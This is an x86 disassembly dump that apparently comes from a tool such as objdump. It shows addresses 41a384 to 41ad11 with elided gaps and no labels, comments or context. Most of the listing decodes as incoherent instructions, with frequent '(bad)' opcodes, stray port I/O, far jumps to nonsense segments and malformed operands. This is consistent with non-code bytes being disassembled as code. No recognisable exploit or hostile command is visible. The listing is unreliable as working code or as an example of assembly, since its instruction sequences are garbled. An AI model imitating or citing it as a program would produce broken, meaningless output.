  41a384:	sub    edx,DWORD PTR [esi]
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0x80000001
  41a38d:	xor    dh,BYTE PTR [ecx]
  41a38f:	sub    eax,0x80d6d335
  41a394:	inc    esp
  41a395:	xor    eax,0xb393b10
  41a39a:	nop
  41a39b:	pop    edx
  41a39c:	out    0x23,eax
  41a39e:	jecxz  0x41a3a6
  41a3a0:	pop    eax
  41a3a1:	stos   BYTE PTR es:[edi],al
  41a3a2:	lds    ebx,FWORD PTR [edx+0x254623d1]
  41a3a8:	pop    esi
  41a3a9:	pusha  
  41a3aa:	dec    ebx
  41a3ab:	lahf   
  41a3ac:	clc    
  41a3ad:	ss iret 
  41a3af:	xchg   DWORD PTR [ebx-0x3b],esp
  41a3b2:	mov    es,WORD PTR [edi+eax*4+0x70]
  41a3b6:	pop    ebp
  41a3b7:	fsubr  DWORD PTR ds:0x5e0ebefd
  41a3bd:	cmc    
  41a3be:	clc    
  41a3bf:	fadd   DWORD PTR [esp+edi*8-0x4f]
  41a3c3:	mov    eax,ds:0x3033a0e5
  41a3c8:	call   0x18df9d18
  41a3cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3ce:	jecxz  0x41a399
  41a3d0:	int    0xc3
  41a3d2:	(bad)  
  41a3d3:	test   eax,0x7a2a3048
  41a3d8:	dec    edx
  41a3d9:	sub    eax,0x22707828
  41a3de:	xchg   esp,eax
  41a3df:	mov    BYTE PTR [ebx],bh
  41a3e1:	stc    
  41a3e2:	mov    ch,0x6
  41a3e4:	int    0x6
  41a3e6:	dec    esi
  41a3e7:	mov    ds:0xd4162774,eax
  41a3ec:	adc    BYTE PTR [esp+ebx*4+0x5c7bbdea],ah
  41a3f3:	adc    DWORD PTR [ebx+0x25],ebp
  41a3f6:	inc    ebx
  41a3f7:	lods   al,BYTE PTR ds:[esi]
  41a3f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3f9:	mov    ds:0xba122e51,al
  41a3fe:	or     eax,0x959d776d
  41a403:	jmp    0x64c5:0xc66c2350
  41a40a:	or     BYTE PTR ds:0x7c93882d,0xd
  41a411:	std    
  41a412:	pop    eax
  41a413:	xor    bl,bh
  41a415:	mov    al,ds:0xc9c7f934
  41a41a:	pusha  
  41a41b:	xor    edi,edi
  41a41d:	fs dec edi
  41a41f:	jmp    0x41a47a
  41a421:	xor    ah,BYTE PTR [edi]
  41a423:	dec    eax
  41a424:	inc    DWORD PTR [ecx]
  41a426:	popf   
  41a427:	cmp    eax,0x47d9fafb
  41a42c:	(bad)  
  41a42d:	xor    eax,DWORD PTR ds:0xfcbc3ef4
  41a433:	sub    al,0xa3
  41a435:	(bad)  
  41a436:	xchg   ebx,eax
  41a437:	or     eax,0xcbbc275f
  41a43c:	cmp    BYTE PTR [ebp-0x64cf1ef3],al
  41a442:	call   0x5897b55c
  41a447:	inc    esi
  41a448:	dec    eax
  41a449:	test   eax,0xa9d233f5
  41a44e:	sar    eax,0x33
  41a451:	iret   
  41a452:	scas   eax,DWORD PTR es:[edi]
  41a453:	mov    ds:0xfd38a530,eax
  41a458:	fs cwde 
  41a45a:	push   es
  41a45b:	jmp    0xde3d6142
  41a460:	jl     0x41a495
  41a462:	sub    eax,0x64282c26
  41a467:	inc    di
  41a469:	je     0x41a488
  41a46b:	mov    dl,0x91
  41a46d:	jge    0x41a447
  41a46f:	mov    cl,0xaa
  41a471:	bnd jg 0x41a463
  41a474:	mov    cl,0x62
  41a476:	or     ch,BYTE PTR [eax+0x36]
  41a479:	and    bl,BYTE PTR [edx+edx*1+0x1]
  41a47d:	dec    ebp
  41a47e:	outs   dx,DWORD PTR ds:[esi]
  41a47f:	xchg   ebp,eax
  41a480:	mov    ecx,DWORD PTR [eax-0x46a467fd]
  41a486:	sub    DWORD PTR [ebp-0x7e1d0fd3],edi
  41a48c:	in     al,0x83
  41a48e:	outs   dx,DWORD PTR ds:[esi]
  41a48f:	(bad)  
  41a490:	push   ds
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	int3   
  41a501:	push   esi
  41a502:	fcomi  st,st(6)
  41a504:	xor    BYTE PTR [edi],dl
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0xc5000001
  41a50d:	data16 out dx,al
  41a50f:	pop    esp
  41a510:	or     al,0x56
  41a512:	icebp  
  41a513:	ja     0x41a51b
  41a515:	mul    eax
  41a517:	jb     0x41a50f
  41a519:	mov    ch,0x64
  41a51b:	ds inc ebx
  41a51d:	pop    esi
  41a51e:	jp     0x41a4e2
  41a520:	rol    BYTE PTR [edi+ebp*4-0x21],cl
  41a524:	mov    bh,0x7b
  41a526:	mov    esp,0x28fd7a2b
  41a52b:	jecxz  0x41a544
  41a52d:	adc    DWORD PTR [esi-0x44],esp
  41a530:	out    dx,eax
  41a531:	loop   0x41a52c
  41a533:	std    
  41a534:	ret    
  41a535:	stos   DWORD PTR es:[edi],eax
  41a536:	mov    ds:0x6c18a852,eax
  41a53b:	sbb    ebx,DWORD PTR [ecx-0x3b]
  41a53e:	icebp  
  41a53f:	cwde   
  41a540:	in     al,dx
  41a541:	xchg   esp,eax
  41a542:	mov    eax,ds:0xfb1684ae
  41a547:	xchg   ebp,eax
  41a548:	dec    esp
  41a549:	int    0x89
  41a54b:	pop    esi
  41a54c:	rcr    DWORD PTR [ecx],0x9e
  41a54f:	or     ebx,edi
  41a551:	jge    0x41a5c3
  41a553:	push   esp
  41a554:	idiv   DWORD PTR [eax]
  41a556:	dec    ebx
  41a557:	dec    ebx
  41a558:	adc    cl,BYTE PTR [ebp+0x18]
  41a55b:	test   DWORD PTR [edx+0x5fc331c1],esp
  41a561:	dec    ebp
  41a562:	sti    
  41a563:	lds    esi,FWORD PTR ds:0xb7155fb6
  41a569:	call   0x12eb:0x1155cb1f
  41a570:	lods   al,BYTE PTR ds:[esi]
  41a571:	push   esi
  41a572:	add    bh,dh
  41a574:	sub    eax,0x4f1c2d7c
  41a579:	inc    esp
  41a57a:	mov    esi,0x35d7db3a
  41a57f:	int3   
  41a580:	or     eax,0x57f74111
  41a585:	test   DWORD PTR [ecx+0x4],edx
  41a588:	arpl   bp,sp
  41a58a:	test   BYTE PTR [ebx],cl
  41a58c:	mov    eax,0xd4ddc9c9
  41a591:	scas   eax,DWORD PTR es:[edi]
  41a592:	mov    cl,0x12
  41a594:	pop    esp
  41a595:	xchg   esp,eax
  41a596:	xchg   ebp,eax
  41a597:	jae    0x41a5b3
  41a599:	xchg   ecx,eax
  41a59a:	in     eax,0x4e
  41a59c:	inc    ebp
  41a59d:	mov    cl,0x67
  41a59f:	repz (bad) 
  41a5a1:	pusha  
  41a5a2:	push   ds
  41a5a3:	xchg   edi,eax
  41a5a4:	aaa    
  41a5a5:	pop    esi
  41a5a6:	lods   al,BYTE PTR ds:[esi]
  41a5a7:	ins    BYTE PTR es:[edi],dx
  41a5a8:	es nop
  41a5aa:	push   ss
  41a5ab:	scas   al,BYTE PTR es:[edi]
  41a5ac:	js     0x41a586
  41a5ae:	push   esp
  41a5af:	stc    
  41a5b0:	aas    
  41a5b1:	sbb    esi,edx
  41a5b3:	inc    ecx
  41a5b4:	sub    ecx,ebx
  41a5b6:	ja     0x41a5d8
  41a5b8:	dec    edi
  41a5b9:	loopne 0x41a57e
  41a5bb:	mov    bl,0x67
  41a5bd:	cmc    
  41a5be:	xchg   esi,eax
  41a5bf:	cmp    al,0xc
  41a5c1:	pop    edi
  41a5c2:	add    DWORD PTR [eax+0x26],ecx
  41a5c5:	or     DWORD PTR [esi],edi
  41a5c7:	loope  0x41a591
  41a5c9:	lods   eax,DWORD PTR ds:[esi]
  41a5ca:	inc    esp
  41a5cb:	popf   
  41a5cc:	leave  
  41a5cd:	outs   dx,DWORD PTR ds:[esi]
  41a5ce:	(bad)  
  41a5cf:	pop    esi
  41a5d0:	mov    dl,0xe8
  41a5d2:	(bad)  
  41a5d3:	adc    eax,0x22bbb60d
  41a5d8:	jmp    0x41a5ab
  41a5da:	(bad)  
  41a5db:	pop    ecx
  41a5dc:	mov    DWORD PTR [esp+eiz*2-0x7d],eax
  41a5e0:	ret    0x2de8
  41a5e3:	pop    eax
  41a5e4:	stos   BYTE PTR es:[edi],al
  41a5e5:	pop    ax
  41a5e7:	dec    ebp
  41a5e8:	and    edi,0x36b220d4
  41a5ee:	push   ecx
  41a5ef:	jg     0x41a5e9
  41a5f1:	paddw  mm4,mm0
  41a5f4:	push   esp
  41a5f5:	push   edi
  41a5f6:	push   edx
  41a5f7:	scas   al,BYTE PTR es:[edi]
  41a5f8:	dec    eax
  41a5f9:	adc    DWORD PTR [ebp+esi*4-0x5dd76580],edi
  41a600:	pop    eax
  41a601:	mov    ebp,eax
  41a603:	ins    DWORD PTR es:[edi],dx
  41a604:	xchg   esp,eax
  41a605:	imul   edx,DWORD PTR [edx+0x276bede5],0x812a2f5d
  41a60f:	scas   eax,DWORD PTR es:[edi]
  41a610:	mov    al,ds:0x0
	...
  41a671:	add    BYTE PTR [eax],al
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x483da625
  41a682:	xor    ah,dl
  41a684:	xor    eax,0x5000118
  41a689:	add    DWORD PTR [eax],eax
  41a68b:	add    BYTE PTR [edi],bh
  41a68d:	(bad)
  41a690:	jp     0x41a6df
  41a692:	js     0x41a654
  41a694:	pusha  
  41a695:	cmp    esi,ebx
  41a697:	mov    esp,0xc41de401
  41a69c:	bndldx (bad),[edi]
  41a69f:	not    esi
  41a6a1:	inc    ecx
  41a6a2:	mov    DWORD PTR [edi-0x8],ebp
  41a6a5:	cld    
  41a6a6:	shl    dh,cl
  41a6a8:	ret    0xbd7
  41a6ab:	adc    esp,DWORD PTR [ebp-0x2cf9aceb]
  41a6b1:	add    al,0xa5
  41a6b3:	xor    al,0xac
  41a6b5:	pop    eax
  41a6b6:	mov    eax,ds:0x8172aa45
  41a6bb:	lods   al,BYTE PTR ds:[esi]
  41a6bc:	pop    ebx
  41a6bd:	mov    edx,ebp
  41a6bf:	mov    ecx,?
  41a6c1:	xlat   BYTE PTR ds:[ebx]
  41a6c2:	(bad)  [ecx-0x36]
  41a6c5:	fs or  eax,0x19995c59
  41a6cb:	sbb    al,bh
  41a6cd:	iret   
  41a6ce:	jne    0x41a67c
  41a6d0:	pushf  
  41a6d1:	push   0x36
  41a6d3:	mov    ebx,0xd710b910
  41a6d8:	data16 fsubr st,st(5)
  41a6db:	fmul   DWORD PTR [eax+0x2b]
  41a6de:	lods   al,BYTE PTR ds:[esi]
  41a6df:	fsubr  st,st(2)
  41a6e1:	xor    bh,ah
  41a6e3:	cs xchg edx,eax
  41a6e5:	jl     0x41a754
  41a6e7:	ss mov esi,0x482d6e2d
  41a6ed:	pop    ebp
  41a6ee:	into   
  41a6ef:	ds enter 0x66ea,0x34
  41a6f4:	es pop esp
  41a6f6:	inc    esi
  41a6f7:	push   ecx
  41a6f8:	(bad)  
  41a6f9:	imul   edx,DWORD PTR [ecx-0x8],0xffffffab
  41a6fd:	or     DWORD PTR [ecx],0x42
  41a700:	jae    0x41a68d
  41a702:	mov    al,0x45
  41a704:	xchg   ebp,eax
  41a705:	mov    eax,ds:0x37c916cd
  41a70a:	jle    0x41a748
  41a70c:	jecxz  0x41a77f
  41a70e:	add    DWORD PTR [ecx],0xffffffad
  41a711:	ja     0x41a6ce
  41a713:	add    bh,BYTE PTR [ebp+0x36ba87ef]
  41a719:	jne    0x41a6dd
  41a71b:	iret   
  41a71c:	jo     0x41a75a
  41a71e:	push   ds
  41a71f:	dec    ebx
  41a720:	dec    edx
  41a721:	imul   esi,ebx,0xe35d37d8
  41a727:	retf   0xc245
  41a72a:	shl    BYTE PTR [edx-0x46],1
  41a72d:	pushf  
  41a72e:	xor    eax,0xeca1905e
  41a733:	pop    edx
  41a734:	pop    es
  41a735:	mov    ebp,0x21d12f03
  41a73a:	or     DWORD PTR [ebp-0x414a555b],ecx
  41a740:	adc    DWORD PTR [edx+0x6fb58a9b],edi
  41a746:	inc    eax
  41a747:	(bad)  
  41a748:	pop    ebp
  41a749:	or     ecx,DWORD PTR [edi-0x7c]
  41a74c:	add    DWORD PTR [eax],edx
  41a74e:	inc    esi
  41a74f:	arpl   WORD PTR [esi-0x4d],cx
  41a752:	inc    edi
  41a753:	xor    eax,0xd0e046c5
  41a758:	and    eax,0x938ba0b2
  41a75d:	popf   
  41a75e:	xor    dl,BYTE PTR [ebp+0x4c46b1a2]
  41a764:	mov    ds:0x8030711f,eax
  41a769:	mov    esi,0x5ee0cc10
  41a76e:	pop    esp
  41a76f:	in     eax,dx
  41a770:	dec    ebx
  41a771:	test   BYTE PTR [eax+0x7b0c1123],0xb3
  41a778:	push   ebp
  41a779:	dec    ebp
  41a77a:	add    al,BYTE PTR [edi+0x46eb9625]
  41a780:	sbb    edi,ebp
  41a782:	ret    0xf062
  41a785:	pop    ecx
  41a786:	push   ds
  41a787:	inc    eax
  41a788:	cli    
  41a789:	xor    eax,0xc42af439
  41a78e:	xchg   ebx,eax
  41a78f:	mov    ebp,0xf5
	...
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x835327ca,al
  41a801:	add    ebp,edi
  41a803:	xchg   edx,eax
  41a804:	cmp    bl,BYTE PTR [ecx]
  41a806:	add    DWORD PTR [eax],eax
  41a808:	add    eax,0xb3000001
  41a80d:	jae    0x41a7b7
  41a80f:	sti    
  41a810:	daa    
  41a811:	jg     0x41a7e2
  41a813:	ret    
  41a814:	mov    WORD PTR [edx+eiz*4+0xfab53b5],?
  41a81b:	scas   al,BYTE PTR es:[edi]
  41a81c:	std    
  41a81d:	pop    ecx
  41a81e:	xchg   esp,eax
  41a81f:	daa    
  41a820:	adc    dl,dl
  41a822:	sub    al,dl
  41a824:	shl    DWORD PTR [esi-0x71],1
  41a827:	hlt    
  41a828:	or     BYTE PTR cs:[esi+0x13],ah
  41a82c:	or     eax,0xeeb39875
  41a831:	in     al,0xdb
  41a833:	sbb    eax,edx
  41a835:	adc    al,0x6a
  41a837:	mov    edx,DWORD PTR [edi+eiz*4-0x2c]
  41a83b:	mov    esp,0xc414863c
  41a840:	test   ecx,ebx
  41a842:	pop    esi
  41a843:	mov    eax,0xe9fbc1dc
  41a848:	pop    esp
  41a849:	inc    ebp
  41a84a:	mov    bh,0x3c
  41a84c:	fcomp  DWORD PTR [ebx-0x7cc3411a]
  41a852:	(bad)  
  41a854:	(bad)  
  41a855:	scas   eax,DWORD PTR es:[edi]
  41a856:	push   edi
  41a857:	pushf  
  41a858:	adc    BYTE PTR [edi+0x10],0x75
  41a85c:	mov    ds:0xc25e20b4,al
  41a861:	xchg   edi,eax
  41a862:	dec    esi
  41a863:	and    al,0x53
  41a865:	or     al,0x9c
  41a867:	mov    eax,0x1aa5985b
  41a86c:	xchg   DWORD PTR [ebp-0x209d9058],eax
  41a872:	popa   
  41a873:	cmp    ebx,DWORD PTR [ebx+edx*2+0x4a935e28]
  41a87a:	and    BYTE PTR [eax+0x25ebe006],bl
  41a880:	fiadd  DWORD PTR [ecx]
  41a882:	or     dl,BYTE PTR [ebx]
  41a884:	ds inc edi
  41a886:	sar    ebx,0xd5
  41a889:	call   0xe4ab:0xb09fbaca
  41a890:	sbb    al,0x69
  41a892:	aas    
  41a893:	dec    edx
  41a894:	ins    DWORD PTR es:[edi],dx
  41a895:	lea    edx,[edi-0x7]
  41a898:	fs loope 0x41a8c7
  41a89b:	jl     0x41a85f
  41a89d:	sbb    al,0xeb
  41a89f:	or     esp,DWORD PTR [ecx+esi*1]
  41a8a2:	sti    
  41a8a3:	jmp    0x979a:0xf110aa50
  41a8aa:	int3   
  41a8ab:	sahf   
  41a8ac:	arpl   WORD PTR [edi+0x3e7eba1c],sp
  41a8b2:	add    eax,0x9d5729d1
  41a8b7:	push   esp
  41a8b8:	xchg   esi,eax
  41a8b9:	aad    0xbc
  41a8bb:	pop    eax
  41a8bc:	push   edx
  41a8bd:	fldenv [ebx+0x7d]
  41a8c0:	ret    0xe0dd
  41a8c3:	pop    esi
  41a8c4:	js     0x41a8c3
  41a8c6:	loopne 0x41a86e
  41a8c8:	icebp  
  41a8c9:	adc    bl,BYTE PTR [edi+0x30]
  41a8cc:	cmp    esi,edi
  41a8ce:	push   cs
  41a8cf:	adc    al,0xc7
  41a8d1:	xchg   BYTE PTR [esi+0x2c],bl
  41a8d4:	xchg   edi,eax
  41a8d5:	(bad)  
  41a8d6:	outs   dx,DWORD PTR ds:[esi]
  41a8d7:	sti    
  41a8d8:	bt     DWORD PTR [ebx+0x7f],esp
  41a8dc:	xor    eax,0xc101e47b
  41a8e2:	les    edx,FWORD PTR [eax+ebx*1]
  41a8e5:	mov    edx,0x724abb2e
  41a8ea:	outs   dx,DWORD PTR ds:[esi]
  41a8eb:	rcr    cl,1
  41a8ed:	push   esi
  41a8ee:	mov    ah,0x11
  41a8f0:	mov    bh,0x1a
  41a8f2:	xor    eax,DWORD PTR [ecx-0x1]
  41a8f5:	or     cl,BYTE PTR [ebx-0xa]
  41a8f8:	sbb    BYTE PTR [esp+edi*4],cl
  41a8fb:	push   ds
  41a8fc:	mov    esp,ecx
  41a8fe:	jae    0x41a8c5
  41a900:	xchg   edx,eax
  41a901:	adc    al,0x98
  41a903:	push   esi
  41a904:	leave  
  41a905:	js     0x41a89c
  41a907:	iret   
  41a908:	pop    esp
  41a909:	fidivr DWORD PTR [eax]
  41a90b:	adc    ebp,esi
  41a90d:	jge    0x41a98a
  41a90f:	mov    cl,0x61
	...
  41a971:	add    BYTE PTR [eax],al
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	or     al,0x7d
  41a982:	stos   BYTE PTR es:[edi],al
  41a983:	call   0x105:0x11a3f
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	jns    0x41a98f
  41a98e:	sbb    esp,DWORD PTR [edx]
  41a990:	cld    
  41a991:	loope  0x41a93f
  41a993:	aaa    
  41a994:	shl    BYTE PTR [eax-0x57],1
  41a997:	jp     0x41a9e5
  41a999:	lock fidivr WORD PTR [esi-0x63c619a8]
  41a9a0:	push   ds
  41a9a1:	sbb    al,0x7e
  41a9a3:	mov    dh,0x5d
  41a9a5:	ja     0x41a9b0
  41a9a7:	not    BYTE PTR ds:0xd610cfae
  41a9ad:	mov    edi,0x1ea4fc93
  41a9b2:	sar    BYTE PTR [eax-0x3ebd63a3],1
  41a9b8:	ror    BYTE PTR [esi+0x3cc1602f],1
  41a9be:	xor    al,0x40
  41a9c0:	push   edi
  41a9c1:	lahf   
  41a9c2:	mov    ds:0xdfba8664,eax
  41a9c7:	jp     0x41aa2e
  41a9c9:	inc    edi
  41a9ca:	test   al,0x86
  41a9cc:	inc    ebp
  41a9cd:	mov    ds:0x78046e21,al
  41a9d2:	sbb    ebp,DWORD PTR [ebx-0xeefd58e]
  41a9d8:	push   ds
  41a9d9:	out    dx,al
  41a9da:	dec    eax
  41a9db:	jge    0x41aa2e
  41a9dd:	push   cs
  41a9de:	out    0x7f,al
  41a9e0:	mov    cl,0xfd
  41a9e2:	mov    al,ds:0xb6ea0e11
  41a9e7:	mov    dl,0xc
  41a9e9:	sbb    al,0x38
  41a9eb:	call   0x36d2:0x44a2c142
  41a9f2:	loopne 0x41a995
  41a9f4:	test   al,0xbf
  41a9f6:	jecxz  0x41aa38
  41a9f8:	sub    al,0x42
  41a9fa:	mov    edx,0x5c65c7ca
  41a9ff:	adc    dh,BYTE PTR [edx+0x32b3a43a]
  41aa05:	inc    esi
  41aa06:	sbb    eax,0xba253f68
  41aa0b:	mov    bh,0xc0
  41aa0d:	pop    ebp
  41aa0e:	cdq    
  41aa0f:	mov    edx,0xfe53d6a0
  41aa14:	outs   dx,DWORD PTR ds:[esi]
  41aa15:	adc    DWORD PTR [esi],esi
  41aa17:	xchg   ebx,eax
  41aa18:	fucompp 
  41aa1a:	mov    edx,0x3c209b4a
  41aa1f:	pop    eax
  41aa20:	inc    edi
  41aa21:	mov    ds:0xe9542a3e,eax
  41aa26:	inc    edx
  41aa27:	sbb    ecx,edx
  41aa29:	mov    edx,0xfbfc62c7
  41aa2e:	pop    eax
  41aa2f:	sbb    ebx,ecx
  41aa31:	xchg   BYTE PTR [ebx+eax*1],bh
  41aa34:	push   edi
  41aa35:	mov    eax,ds:0x8ba7cca4
  41aa3a:	mov    ebx,0x9349b8fd
  41aa3f:	mov    ds:0xccdd5d86,eax
  41aa44:	inc    ebx
  41aa45:	mov    eax,0x5492b7c
  41aa4a:	out    dx,al
  41aa4b:	(bad)  
  41aa4d:	pusha  
  41aa4e:	inc    eax
  41aa4f:	inc    esp
  41aa50:	mov    ecx,0x33a3f52a
  41aa55:	hlt    
  41aa56:	mov    fs,ebx
  41aa58:	mov    ebx,ebx
  41aa5a:	out    0x62,al
  41aa5c:	jmp    0xd784dd51
  41aa61:	data16 fisttp QWORD PTR ds:0x864af047
  41aa68:	scas   eax,DWORD PTR es:[edi]
  41aa69:	or     al,0x7
  41aa6b:	in     eax,dx
  41aa6c:	jbe    0x41aa14
  41aa6e:	in     al,dx
  41aa6f:	and    al,0xc2
  41aa71:	(bad)  
  41aa72:	dec    esi
  41aa73:	aaa    
  41aa74:	into   
  41aa75:	add    BYTE PTR [eax+0x50],ah
  41aa78:	sub    BYTE PTR [esi+0x712392ae],ch
  41aa7e:	into   
  41aa7f:	dec    ebp
  41aa80:	mov    ds:0xe9789071,eax
  41aa85:	aaa    
  41aa86:	int3   
  41aa87:	cmp    DWORD PTR [ecx+ebp*4],ebp
  41aa8a:	mov    dh,0x13
  41aa8c:	pop    ecx
  41aa8d:	pop    edx
  41aa8e:	sub    eax,0xec1
	...
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	sub    dh,BYTE PTR [esp+ebx*8+0x11b44c2]
  41ab07:	add    BYTE PTR ds:0xbe000001,al
  41ab0d:	sbb    BYTE PTR [edx],dh
  41ab0f:	pop    edi
  41ab10:	out    dx,al
  41ab11:	or     eax,DWORD PTR [edx+edx*2+0x4]
  41ab15:	lds    edi,FWORD PTR [edi-0x75]
  41ab18:	in     eax,dx
  41ab19:	add    BYTE PTR [edx],dl
  41ab1b:	mov    ebx,0xdd7fe126
  41ab20:	ror    BYTE PTR [ebp+eiz*8-0x7fe86bca],cl
  41ab27:	push   ebx
  41ab28:	fisttp DWORD PTR [ebp-0x1ae99d9b]
  41ab2e:	outs   dx,BYTE PTR ds:[esi]
  41ab2f:	jle    0x41ab58
  41ab31:	pop    ss
  41ab32:	retf   0x650f
  41ab35:	sbb    al,0xcc
  41ab37:	dec    esp
  41ab38:	loopne 0x41ab1a
  41ab3a:	mov    edi,0x705c8f5f
  41ab3f:	ret    0xc12a
  41ab42:	lods   eax,DWORD PTR ds:[esi]
  41ab43:	mov    ch,0xfd
  41ab45:	add    eax,0x2b96dfc
  41ab4a:	cmp    BYTE PTR [ebx+0x378c05a0],bh
  41ab50:	sahf   
  41ab51:	(bad)  
  41ab52:	mov    ebp,0xb68dc5c3
  41ab57:	push   cs
  41ab58:	mov    dl,0x7e
  41ab5a:	pop    ecx
  41ab5b:	scas   al,BYTE PTR es:[edi]
  41ab5c:	scas   eax,DWORD PTR es:[edi]
  41ab5d:	clc    
  41ab5e:	inc    esp
  41ab5f:	call   0xedb6:0x472c2491
  41ab66:	and    ecx,DWORD PTR [ebp+0x7e]
  41ab69:	and    ch,BYTE PTR [ebx+ebp*1]
  41ab6c:	push   ecx
  41ab6d:	ds je  0x41abea
  41ab70:	cs push edx
  41ab72:	imul   edi,DWORD PTR [ecx-0x74],0xffffffb4
  41ab76:	xor    al,0x38
  41ab78:	mov    eax,ds:0x5ae447a0
  41ab7d:	jecxz  0x41ab60
  41ab7f:	pop    ebx
  41ab80:	scas   al,BYTE PTR es:[edi]
  41ab81:	cmc    
  41ab82:	jecxz  0x41abbb
  41ab84:	retf   
  41ab85:	xchg   ecx,eax
  41ab86:	je     0x41ab6a
  41ab88:	sti    
  41ab89:	stos   DWORD PTR es:[edi],eax
  41ab8a:	mov    ebx,0xf62e828c
  41ab8f:	lods   al,BYTE PTR ds:[esi]
  41ab90:	dec    ebp
  41ab91:	data16 ficomp WORD PTR [ebx-0x5d]
  41ab95:	mov    dl,0x75
  41ab97:	push   esp
  41ab98:	jl     0x41abe1
  41ab9a:	sbb    al,0xbb
  41ab9c:	ss jge 0x41ab50
  41ab9f:	imul   bl
  41aba1:	inc    ecx
  41aba2:	jmp    0x2889:0xb1aab5f0
  41aba9:	cmp    DWORD PTR [edi-0x15],esi
  41abac:	pusha  
  41abad:	and    eax,0xb303038a
  41abb2:	jle    0x41ac2d
  41abb4:	and    eax,0x773539be
  41abb9:	push   ecx
  41abba:	mov    gs,WORD PTR [ecx]
  41abbc:	addr16 hlt 
  41abbe:	stos   BYTE PTR es:[edi],al
  41abbf:	imul   esp,DWORD PTR [esi],0x61ef6042
  41abc5:	mov    edi,0xc859c02
  41abca:	test   dh,cl
  41abcc:	or     ch,dl
  41abce:	sahf   
  41abcf:	xchg   ecx,eax
  41abd0:	das    
  41abd1:	iret   
  41abd2:	setle  BYTE PTR [edx]
  41abd5:	adc    DWORD PTR [ecx+edx*8],esp
  41abd8:	les    ebp,FWORD PTR [ebx]
  41abda:	loop   0x41ac4f
  41abdc:	fwait
  41abdd:	loope  0x41ab9a
  41abdf:	out    dx,al
  41abe0:	push   esp
  41abe1:	pop    esp
  41abe2:	add    ch,dl
  41abe4:	lahf   
  41abe5:	inc    esp
  41abe6:	push   0x32
  41abe8:	stos   DWORD PTR es:[edi],eax
  41abe9:	lock gs xor al,0xb2
  41abed:	jns    0x41ac0a
  41abef:	sahf   
  41abf0:	inc    ecx
  41abf1:	push   edx
  41abf2:	jbe    0x41ac29
  41abf4:	test   al,ah
  41abf6:	push   edx
  41abf7:	cs std 
  41abf9:	xlat   BYTE PTR ds:[ebx]
  41abfa:	jns    0x41abe3
  41abfc:	mov    esi,0xd4b5b8ec
  41ac01:	dec    edx
  41ac02:	pop    eax
  41ac03:	inc    edi
  41ac04:	lahf   
  41ac05:	push   0xffffffae
  41ac07:	ja     0x41ac25
  41ac09:	adc    eax,edi
  41ac0b:	nop
  41ac0c:	jg     0x41abdd
  41ac0e:	aam    0x9b
  41ac10:	outs   dx,DWORD PTR ds:[esi]
	...
  41ac71:	add    BYTE PTR [eax],al
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [edi+ebp*1-0x2c]
  41ac82:	outs   dx,BYTE PTR ds:[esi]
  41ac83:	xchg   esp,eax
  41ac84:	dec    ecx
  41ac85:	sbb    al,0x1
  41ac87:	add    BYTE PTR ds:0xd3000001,al
  41ac8d:	je     0x41acc4
  41ac8f:	push   DWORD PTR [esi-0x7]
  41ac92:	xchg   esp,eax
  41ac93:	sbb    DWORD PTR [ebx-0x45],ebp
  41ac96:	popa   
  41ac97:	loope  0x41acf7
  41ac99:	outs   dx,DWORD PTR ds:[esi]
  41ac9a:	mov    ebp,eax
  41ac9c:	add    BYTE PTR [eax+ebx*8],bh
  41ac9f:	sahf   
  41aca0:	xchg   cl,al
  41aca2:	in     al,dx
  41aca3:	sahf   
  41aca4:	leave  
  41aca5:	sub    DWORD PTR [edi],ecx
  41aca7:	xor    BYTE PTR [esi-0x1a748b64],0xac
  41acae:	sbb    al,0x1
  41acb0:	sub    dl,BYTE PTR [esp+eiz*2+0xb77de33]
  41acb7:	push   edx
  41acb8:	retf   
  41acb9:	lock xchg ecx,eax
  41acbb:	mov    eax,db3
  41acbe:	pop    ebx
  41acbf:	push   esi
  41acc0:	iret   
  41acc1:	call   0xff95d08f
  41acc6:	stc    
  41acc7:	mov    ah,0x93
  41acc9:	xlat   BYTE PTR ds:[ebx]
  41acca:	rcr    dl,cl
  41accc:	hlt    
  41accd:	jmp    0xd3b9:0x77415b4e
  41acd4:	stos   BYTE PTR es:[edi],al
  41acd5:	jp     0x41acdc
  41acd7:	dec    eax
  41acd8:	inc    eax
  41acd9:	test   DWORD PTR [eax+ebx*1+0x63a1fefc],0xf8089575
  41ace4:	jae    0x41ac7d
  41ace6:	ror    DWORD PTR [esi-0x202766c1],1
  41acec:	adc    ah,dl
  41acee:	adc    bh,BYTE PTR [esi-0x42]
  41acf1:	bound  ebx,QWORD PTR [ecx+0x55b6ced6]
  41acf7:	xchg   edi,eax
  41acf8:	cld    
  41acf9:	add    ebp,DWORD PTR [eax]
  41acfb:	mov    al,ds:0x2fd2f375
  41ad00:	in     eax,dx
  41ad01:	jae    0x41ad55
  41ad03:	loop   0x41ad02
  41ad05:	or     DWORD PTR [ebp+0x6b],ebx
  41ad08:	push   edi
  41ad09:	and    eax,0x1bdaa59a
  41ad0e:	out    0xbb,eax
  41ad10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad11:	mov    ds,esp
